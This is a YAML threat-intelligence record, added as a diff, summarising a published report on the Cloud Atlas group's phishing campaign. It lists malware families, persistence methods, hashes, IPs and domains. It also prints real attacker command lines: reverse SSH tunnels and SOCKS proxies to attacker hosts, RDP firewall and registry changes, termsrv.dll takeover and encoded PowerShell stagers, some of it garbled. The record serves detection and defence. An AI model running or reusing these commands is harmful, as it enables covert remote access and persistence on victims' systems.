@@ -1,0 +1,327 @@
+title: 'Cloud Atlas activity in the second half of 2025 and early 2026: new tools
+  and a new payload'
+description: Cloud Atlas threat actor uses phishing ZIPs/RARs to deliver PowerShell-based
+  stagers (fixed.ps1, PowerShower), VBS scripts, and tools for credential theft, RDP
+  enablement, SSH tunneling, and reverse SOCKS proxying against targets. The campaign
+  introduces new payloads including termsrv.dll patching for concurrent RDP sessions
+  and Tor-based C2 infrastructure.
+attribution: Cloud Atlas
+malware_families:
+- VBCloud
+- PowerShower
+- PowerCloud
+- RevSocks
+- fixed.ps1
+- googleearth.ps1
+- drdp_new.ps1
+- video.vbs
+- video.mds
+- esentprf.exe
+- conhosts.exe
+- client.exe
+- vmnetdrv64.exe
+- Intel.exe
+- bounce.exe
+cves:
+- CVE-2018-0802
+ttps:
+  processes:
+  - powershell.exe
+  - taskkill.exe
+  - winrar.exe
+  - fodhelper.exe
+  - PAExec
+  - PsExec
+  - ssh.exe
+  - wscript.exe
+  - schtasks.exe
+  - takeown.exe
+  - cmd.exe
+  - PAExec.exe
+  - conhosts.exe
+  command_lines:
+  - taskkill.exe /F /Im winrar.exe
+  - powershell -ep bypass -w 01 C:\Users\[user_name]\AppData\Local\Temp\fixed.psl
+  - netsh advfirewall firewall add rule name="Remote Desktop" dir=in protocol=tcp
+    localport=3389 profile=any action=allow
+  - takeown /f c:\windows\system32\termsrv.dll
+  - cmd /c "icacls c:\windows\system32\termsrv.dll /Grant SYSTEM:F /C"
+  - PAExec-[redacted]-[remote_hostname].exe -service "wscript.exe" /B $appdata\run.vbs
+  - conhosts.exe -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null
+    -R 2227 inn@goverru[.]com -i C:\Python27\ArcGIE10.6\log
+  - '"schtasks.exe" /Create /TN \Microsoft\Windows\EDP\EDPControlStart /TR "C:\Windows\INF\BITS\esentprf.exe
+    -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null
+    -R 4847$5@81.30.105[.]171 -i C:\Windows\INF\BITS\esent" /SC ONSTART /RL HIGHEST
+    /RU SYSTEM /F'
+  - c:\programdata\hp\client.exe -connect cloudguide[.]in:444 -pass [redacted] -rect
+    300 -recn 2
+  - $system32\TimeControlSvc\vmnetdrv64.exe -connect tenkoff[.]org:505 -pass [redacted]
+  - C:\Windows\LiveKernelReports\update.exe -connect kufar[.]org:2222 -pass [redacted]
+    -rect 9@ -recn 2
+  - Powershell.exe -w Hidden -c "$a=12;$tx=[io.file]::ReadAllText("""$documents\documentAcrobat.pdf""");
+    powershell -wHidden -ec $tx;"
+  - PowerShell.exe -w Hidden -ec KABnAHcAbQBpPACAALQBSAGkACWB..
+  powershell:
+  - rdp_new.ps1
+  - fixed.ps1
+  - googleearth.ps1
+  - powershell ec ZABuAHsACIAJACONYuBoADERTANIACANAQBYAGOAL ADOAHAAABUANNAOGAYRCBnQBuAHYAZOB=HQAA0BKACENLAB1ACUAAOBACAALuBVAGOALYBURK
+    IDuBKAHUALBOAHHALyBkACUA buBl GBic g BhACAAdABzACORC By GuhbAAtAG8ADgA, AHHAbYBYHOAPQBu
+    CucoBOANKALyB 1A Canc g BoAlHALOBhACYAOunJA ks 0BnACARKAAKACHAsARXACKACORJAHSACORJARKRIABRAHI
+    AT AASACARJABIACaAMABLACOANQAUACAALGAKACHRaAAXACAATAB1ACAAZyBOACYAHQAgACORagBunCkbgfianCodun
+    PAAKACRIACOAdyBoACSATAASACARUELG oA BOACAARGBuUACHA BBl by B FOROg6A FUR g BoA
+    CHABVBKACUALyBHAGUAAABTAHOACoBonCAAZuiiof FonOuButAndgB1ANT hdABdADoROYBGAl TAbuBEAE]
+    Y QB2 CURNgADA PHAdA By Ckiibg B Can JABRAHI AKQARADSACQnJAAKAAGBIAHgATARKAHEAS0BADSACORJARKAJABINCAANQASACORDgBTACuAbARTAAKACORIACART
+    AAgAAKAJABOACURL OBEADDAKAREACoAbUBRAGARTARzADAAMARUACAANGAYADGAT ABSACAARYB1AHOALOBS
+    AGEA babkACORbONYACOAGuBuAHUA b BOACAANGARACOANGA7AAKACOB2A Cun ZOB1ARAAT AKAHORZ0BHAGOROwES
+    A BpACURLGRGRC R dABSRHKA LAREACAAZORGADER KAB3
+  - Bypass enc_ZgBIAE4AYuBOAEKATuBUACARBOBRAHQN2ABIAGOAKAAKAHOAY gBPAGUAKOBZAAKAJABIAGQAcgAgADOATARXADSACOAKAGBANYBoADGA
+    1 ARYACARTgB1AHCALOBPAGI Aag B1ACNAAAAGACTAQUBYAG0ATwBiAGOAZQBAHQATABNAMACABEAGuANgAUAFNAZOEyAHYAZOBYAFGATQBMAEAUABUAFAALYA2ACAAMAAZAAKAJABUADI
+    AaAADACAAbUBLACUAbAOACT ARWBFAFQAT gASACARJABOAGI A20BSACUATARKAGYAYQB3AHMAZOAPADSACORKAGEAMyBoADOALyB=AGUAdABPAHARAA
+    BYAGE AbgRoADI ALARKAGEAMyBoADGAT
+  - $klsl = "T24gRXIyb3IgUNVZdAWl1IES1eHQg0iECANSIdG1vhiswcHIphbrSZY3J0dXUoY29zYWEva2dib3BnliE2b33hin.
+    .. ... =";$ed = [Convert]::FromBase64String($klsl);[io.file]::WriteAllBytes("C:\Users\Public\Videos\video.vbs",
+    $ed)
+  - $k1s2 = "JUgXOTQLSDM1JUGKIZQ1SDE4NSYIHTQLSDESNSY I T2JUgxNDC1 ST INSVIMT g1 IUGIMSVINZQLSDE20C";$ed2
+    = [Convert]::FromBase64String($k1s2);[io.file]::WriteAllBytes("C:\Users\Public\Videos\video.mds",
+    $ed2)
+  - Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -name "DisableRestrictedAdmin"
+    -Value 0
+  - Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'
+    -name "fDenyTSConnections" -Value 0
+  - Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp'
+    -name "UserAuthentication" -Value 0
+  - (gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')
+  scripts:
+  - video.vbs
+  - WriteToSchedulerKillSSH.vbs
+  - Create_task_day.vbs
+  - WriteToSchedulerGenerateKey.vbs
+  - WriteToSchedulerRunSSH.vbs
+  - Update.vbs
+  - Gen.vbs
+  - Kill.vbs
+  - Run.vbs
+  - install.vbs
+  - GenK.vbs
+  - C:\Windows\INF\Run.vbs
+  - c:\Windows\INF\install.vbs
+  - c:\Windows\PLA\System\Gen.vbs
+  - C:\Windows\INF\GenK.vbs
+  - c:\Windows\PLA\System\Kill.vbs
+  - c:\Windows\PLA\System\Run.vbs
+  - C:\Users\Public\Videos\video.vbs
+  - fixed.ps1
+  - googleearth.ps1
+  - drdp_new.ps1
+  registry_keys:
+  - YandexBrowser_setup
+  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  - HKLM:\System\CurrentControlSet\Control\Terminal Server
+  - HKLM:\System\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp
+  image_loads:
+  - termsrv.dll
+  - libcrypto.dll
+  - syruntime.dll
+  - kernel32.dll
+  network_connections:
+  - conhosts.exe -> goverru[.]com:2227
+  - esentprf.exe -> 81.30.105[.]171:4847
+  - client.exe -> cloudguide[.]in:444
+  - vmnetdrv64.exe -> tenkoff[.]org:505
+  - update.exe -> kufar[.]org:2222
+  - fixed.ps1 -> investika-club[.]com:443
+  file_activity:
+  - C:\Windows\wininet.exe
+  - C:\Windows\LiveKernelReports\update.exe
+  - C:\Windows\ime\imejp\dicts\i39884.exe
+  - C:\pla\reports.exe
+  - C:\ProgramData\update_[redacted].exe
+  - C:\Windows\migration\wtr\MicrosoftBrowser.exe
+  - C:\Windows\pla\reports\winlog.exe
+  - C:\Windows\System32\timecontrolsvc\vmnetdrv64.exe
+  - C:\Windows\setup\scripts\install\software\activation\aact\dfsvc.exe
+  - C:\Windows\branding\scat.exe
+  - C:\Windows\ime\imekr\dicts\dfsvc.exe
+  - C:\ProgramData\update_[redacted].exe
+  - C:\Users\[redacted]\AppData\Local\1c\1cv8\1cv8ud.exe
+  - C:\Users\[redacted]\AppData\Local\1c\1cv8\svc.exe
+  - C:\Windows\notepad.exe
+  - C:\Windows\splwow32.exe
+  - C:\Users\[redacted]\Desktop\soc\stant.exe
+  - C:\WINDOWS\ime\service.exe
+  - dfsvc.exe
+  - C:\branding\dwmw.exe
+  - C:\ProgramData\checker_[redacted].exe
+  - C:\Windows\PLA\System\bounce.exe
+  - C:\Windows\pla\print_status.exe
+  - C:\ProgramData\hp\client.exe
+  - C:\Windows\System32\timecontrolsvc\vmnetdrv64.exe
+  - C:\Windows\System32\HostManagement.exe
+  - C:\Windows\ime\imejp\msfu.exe
+  - C:\Windows\ime\imetc\help\IMTCEN14.exe
+  - C:\Windows\Resources\Update\Intel.exe
+  - C:\Windows\INF\package.exe
+  - C:\Windows\INF\Run.vbs
+  - c:\Windows\INF\install.vbs
+  - c:\Windows\PLA\System\Gen.vbs
+  - C:\Windows\INF\GenK.vbs
+  - c:\Windows\PLA\System\Kill.vbs
+  - c:\Windows\PLA\System\Run.vbs
+  - c:\Windows\ime\imejp\Asset.exe
+  - c:\Windows\PLA\System\conhosts.exe
+  - c:\Windows\INF\BITS\esentprf.exe
+  - c:\Windows\INF\MSDTC\RuntimeBrokers.exe
+  - c:\Windows\inf\diagnostic.exe
+  - C:\Users\[username]\Pictures\googleearth.ps1
+  - C:\Users\Public\Documents\
+  - video.vbs
+  - video.mds
+  - C:\Windows\INF\BITS\esentprf.exe
+  - C:\Windows\INF\MSDTC\RuntimeBrokers.exe
+  - C:\Windows\inf\diagnostic.exe
+  - C:\Users\Public\Videos\video.vbs
+  - C:\Users\Public\Videos\video.mds
+  - c:\windows\system32\termsrv.dll
+  - C:\Windows\RemotePackages\RemoteApps\data\host
+  - C:\Python27\ArcGIE10.6\log
+  - C:\Windows\INF\BITS\esent
+  persistence:
+  - Registry Run key YandexBrowser_setup pointing to $temp\fixed.ps1
+  - Scheduled task added for reverse SSH tunnel persistence
+  - VBS scripts executed via PAExec or PsExec to install reverse SSH tunnel
+  - Tor HiddenService configured to allow RDP access over Tor network
+  - Registry Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run value YandexBrowser_setup
+    pointing to powershell -ep bypass -w 01 C:\Users\[user_name]\AppData\Local\Temp\fixed.psl
+  - Scheduled task \Microsoft\Windows\EDP\EDPControlStart running C:\Windows\INF\BITS\esentprf.exe
+    at ONSTART with HIGHEST privilege as SYSTEM
+  - VBS scripts placed in C:\Windows\INF\ and C:\Windows\PLA\System\ for scheduled
+    execution
+  - Tor hidden service directory at C:\Windows\RemotePackages\RemoteApps\data\host
+  process_relations:
+  - fodhelper.exe -> powershell.exe
+  - fodhelper.exe -> powershell.exe -w Hidden -c
+  - powershell.exe -> taskkill.exe /F /Im winrar.exe
+  - PAExec.exe -> wscript.exe /B $appdata\run.vbs
+iocs:
+  hashes:
+  - 1a11b26dd0261ef27a112ce8b361c247
+  - 5329f7bff9d0d5db28821b86c26d628f
+  - 7a95360b7e0eb5b107a3d231abbc541a
+  - c0d1eaa15a2cefbab9735787575c8d8e
+  - d5b38b252cf212a4a32763de36732d40
+  - 3c75cedb1196df5eab91f31411ed4b33
+  - 42ac350bfbc5b4eb0fedba16c81919c7
+  - 493b901d1b33eb577db64aadd948f9ce
+  - 2cabb721681455dae1b6a26709def453
+  - 1b39e86eb772a0e40060b672b7f574f1
+  - 1d401d6e6fc0b00aaa2c65a0ac0cfd6b
+  - 40a562b8600f843b717bc5951b2e3c29
+  - f721a76deb28fd0b80d27fce6b8f5016
+  - d3c8afd22baa306ff659db1fac28574a
+  - 6d7b2d1172bbdb7340972d844f6f0717
+  - 9769f43b9de8d19e803263267fa6d62e
+  - 63b6be9ae8d8024a40b200cccb438f1d
+  - 6aa586bcc45ca2e92a4f0ef47e086fa1
+  - eba3bcdb19a7e256bf8e2cc5b9c1cca9
+  - b4e183627b7399006c1bc47b3711e419
+  - f56b31a4b47ad3365b18a7e922fba1a8
+  - f6f62456fb0fcc396fb654cbed339bc3
+  - 25c8ed0511375dca57ef136ac3fa0cca
+  - 2b4ba4facf8c299749771a3a4369782e
+  - ba9ce06641067742f2afc9691faff1dc
+  - fb0f8027acf1b1e47e07a63d8812ed50
+  - bbf1fa694122e07635deeac11ad712f8
+  - f301aa3d62b5095eec4d8e34201a4769
+  - f9c3bbe108566d1a6b070f9c5fb03160
+  - 369b75bdcded16469ede7ab8bedcfae1
+  - 9eaae9491f6a50d6df0be393734a44cb
+  - 3e6e9df00a764b348ec611ee8504aca0
+  - 42085522ec2ebb16edcf814e7c330ad2
+  - 042eb5d52f0b535a1ce6b6f954c8c2b2
+  - aa1e9765ef6b00b94a9b6be0041436a3
+  - 6120f5e9411bcbac7104ef3fa964ed25
+  - 000a353399500bc78381dc95b6ed2dc5
+  - 79a9952d31cad801a3988dbe7914ce78
+  - 67b634588c0fd6b26684d502c15ab033
+  - 8fa4306fa4406ba31cf171af4d36e348
+  - 3edde9f7eeefac0363413972f35572bc
+  - c751619bfec0dc4607c17112b9e3b2ca
+  - 632858f14b36f03d0f213f5f5d6bff20
+  - 97ca205ad9e3b72018750280904718c6
+  - 9121c36eb8bf77962dca825fcffd873c
+  - 5702eb250f855c8c872fffb9bb656ede
+  - d34f5a136fba4fdea976570faa33ed70
+  - ecf8fb6719e14231b94b4d37629b0e08
+  - 57c84b62289a1a9f29e19244e9a4990c
+  - 514e137860f489e3801213460ef93850
+  - 568b1f9335a7e3ba4e5df035a8fb867f
+  - 776ad200287d6de14a29158c45717951
+  - f7f794ed43fb90d0f8ebbb5effe628b8
+  - c753dd254509fba5077ffd5067eab0bc
+  - 3739dec8cd8f54f3f60a85f3ed600eec
+  - 076cd21c483a40156f4e40d08daded21
+  - 6cb7f31d383c0dd892b284df05a49511
+  - 6f59e70a9df97f4adaea71eecb1e9a72
+  - 42ac065b50bcde9308756b49dbadcb81
+  - 58552950d2e13b075001ce0c52aa97a7
+  - 5dbed984963b9ab21309c5b2f8fd9b03
+  - 20dd389fdbab25d46792bd2817675e53
+  - 39d1a666f3e40fe756505cf1d87d4b67
+  - d7e3aeeb673bf60c59361c12a4ed8189
+  - 572f0ed20791a5ac9fc4267d67ccb0b6
+  - aae073e7bfebf4d643c2bbeb5c02e134
+  ip_addresses:
+  - 194.102.104[.]207
+  - 46.17.45[.]56
+  - 46.17.45[.]49
+  - 46.17.44[.]125
+  - 46.17.44[.]212
+  - 185.22.154[.]73
+  - 194.87.196[.]163
+  - 195.58.49[.]99
+  - 3.125.114[.]193
+  - 93.125.114[.]57
+  - 45.87.219[.]116
+  - 37.228.129[.]224
+  - 185.53.179[.]136
+  - 185.126.239[.]77
+  - 5.181.21[.]75
+  - 146.70.53[.]171
+  - 45.15.65[.]134
+  - 185.250.181[.]207
+  - 81.30.105[.]71
+  - 81.30.105[.]171
+  domains:
+  - tenkoff[.]org
+  - cloudguide[.]in
+  - goverru[.]com
+  - kufar[.]org
+  - ultimatecore[.]net
+  - spbnews[.]net
+  - onedrivesupport[.]net
+  - amerikastaj[.]com
+  - bigbang[.]me
+  - paleturquoise-dragonfly-364512.hostingersite[.]com
+  - wizzifi[.]com
+  - totallegacy[.]org
+  - mamurjor[.]com
+  - landscapeuganda[.]com
+  - lafortunaitalian.co[.]uk
+  - kommando[.]live
+  - internationalcommoditiesllc[.]com
+  - humanitas[.]si
+  - fishingflytackle[.]com
+  - firsai.tipshub[.]net
+  - alnakhlah.com[.]sa
+  - allgoodsdirect.com[.]au
+  - agenciakharis.com[.]br
+  - istochnik[.]org
+  - znews[.]net
+  - iinvestika-club[.]com
+  - investika-club[.]com
+  urls: []
+authors: []
+reference: https://securelist.com/cloud-atlas-2026/119895/
+date_of_publication: May 22, 2026
+file_creation_date: May 26, 2026
